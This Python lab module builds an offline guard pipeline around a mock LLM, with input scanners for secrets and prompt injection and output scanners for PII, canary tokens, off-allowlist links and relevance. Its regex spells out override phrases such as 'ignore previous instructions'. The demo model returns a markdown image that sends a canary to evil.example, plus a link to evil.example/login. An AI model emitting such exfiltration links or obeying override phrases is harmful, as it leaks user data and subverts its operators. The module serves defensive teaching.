"""Guarding LLM input AND output: a small AI firewall pipeline, offline.

                +--> input scanners --> model --> output scanners --+
      user ---->|  (block / sanitize)            (redact / block)   |----> user

Input scanners  : Secrets (redact keys), PromptInjection (heuristic)
Output scanners : Sensitive (redact PII and canaries), LinkGuard (markdown images and URLs that are
                  not on an allowlist), Relevance (is the answer about the question?)

This mirrors how products such as LLM Guard, Lakera Guard or Azure Prompt Shields sit in front of a
model. A guard is one SOFT layer. It cannot replace least privilege or data minimisation.
All data is synthetic.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

from aisec_lab import Message, MockLLM

ALLOWED_DOMAINS = ("docs.corp.example", "corp.example")
IMAGE_RE = re.compile(r"!\[[^\]]*\]\(([^)\s]+)[^)]*\)")
URL_RE = re.compile(r"https?://([A-Za-z0-9.-]+)[^\s)\]]*")
EMAIL_RE = re.compile(r"[\w.+-]+@[\w-]+(?:\.[\w-]+)+")
CANARY_RE = re.compile(r"\b(?:CANARY|ACCT|SECRET)-[0-9A-Za-z]{4,}\b")
KEY_RE = re.compile(r"\b(?:sk|AKIA|ghp)[-_A-Za-z0-9]{12,}\b")
INJECTION_RE = re.compile(r"(ignore|disregard) (all |any )?(previous|prior|above|earlier) (instructions|rules)|"
                          r"(reveal|print|show) (your )?(system prompt|instructions)", re.I)
WORD_RE = re.compile(r"[a-z0-9]{3,}")
STOP = {"the", "and", "for", "you", "your", "what", "how", "can", "are", "with", "this", "that", "have", "from"}


@dataclass
class ScanResult:
    text: str
    valid: bool
    reason: str = ""


class InputScanner:
    name = "input"

    def scan(self, prompt: str) -> ScanResult:
        raise NotImplementedError


class OutputScanner:
    name = "output"

    def scan(self, prompt: str, output: str) -> ScanResult:
        raise NotImplementedError


class Secrets(InputScanner):
    name = "Secrets"

    def scan(self, prompt: str) -> ScanResult:
        return ScanResult(KEY_RE.sub("[REDACTED_KEY]", prompt), True)


class PromptInjection(InputScanner):
    name = "PromptInjection"

    def scan(self, prompt: str) -> ScanResult:
        if INJECTION_RE.search(prompt):
            return ScanResult(prompt, False, "prompt injection pattern")
        return ScanResult(prompt, True)


class Sensitive(OutputScanner):
    name = "Sensitive"

    def scan(self, prompt: str, output: str) -> ScanResult:
        cleaned = CANARY_RE.sub("[REDACTED]", EMAIL_RE.sub("[REDACTED_EMAIL]", output))
        return ScanResult(cleaned, True, "redacted" if cleaned != output else "")


@dataclass
class LinkGuard(OutputScanner):
    """Remove markdown images (zero-click exfiltration) and links to unknown domains."""
    allowed: tuple[str, ...] = ALLOWED_DOMAINS
    allow_images: bool = False
    name: str = "LinkGuard"

    def scan(self, prompt: str, output: str) -> ScanResult:
        changed = output
        if not self.allow_images:
            changed = IMAGE_RE.sub("[image removed]", changed)

        def sub(m: re.Match) -> str:
            host = m.group(1).lower()
            ok = any(host == d or host.endswith("." + d) for d in self.allowed)
            return m.group(0) if ok else "[link removed]"

        changed = URL_RE.sub(sub, changed)
        return ScanResult(changed, True, "links removed" if changed != output else "")


@dataclass
class Relevance(OutputScanner):
    """A crude relevance check: share of question keywords that appear in the answer."""
    threshold: float = 0.2
    name: str = "Relevance"

    def scan(self, prompt: str, output: str) -> ScanResult:
        q = {w for w in WORD_RE.findall(prompt.lower()) if w not in STOP}
        a = set(WORD_RE.findall(output.lower()))
        score = len(q & a) / len(q) if q else 1.0
        ok = score >= self.threshold
        return ScanResult(output, ok, "" if ok else f"relevance {score:.2f}")


BLOCKED = "[blocked by guard]"


@dataclass
class GuardedLLM:
    llm: MockLLM
    input_scanners: list[InputScanner] = field(default_factory=lambda: [Secrets(), PromptInjection()])
    output_scanners: list[OutputScanner] = field(default_factory=lambda: [Sensitive(), LinkGuard(), Relevance()])
    log: list[str] = field(default_factory=list)

    def ask(self, prompt: str, context: str = "") -> str:
        for s in self.input_scanners:
            r = s.scan(prompt)
            if not r.valid:
                self.log.append(f"input:{s.name}:{r.reason}")
                return BLOCKED
            prompt = r.text
        content = f"<context>{context}</context>\n{prompt}" if context else prompt
        out = self.llm.complete([{"role": "user", "content": content}])
        for s in self.output_scanners:
            r = s.scan(prompt, out)
            if not r.valid:
                self.log.append(f"output:{s.name}:{r.reason}")
                return BLOCKED
            if r.reason:
                self.log.append(f"output:{s.name}:{r.reason}")
            out = r.text
        return out


class DemoLLM(MockLLM):
    """MockLLM that can also produce the outputs a guard must handle."""

    def complete(self, messages: list[Message]) -> str:
        full = "\n".join(m["content"] for m in messages)
        low = full.lower()
        canary = CANARY_RE.search(full)
        if "status badge" in low and canary:
            return f"Done. ![status](https://evil.example/p.png?d={canary.group(0)})"
        if "weather on mars" in low:
            return "Bananas are yellow and grow in bunches."
        if "who owns the account" in low:
            return "The account owner is bob@corp.example."
        if "show me the docs" in low:
            return "See https://docs.corp.example/refunds and also https://evil.example/login for details on refunds."
        return super().complete(messages)
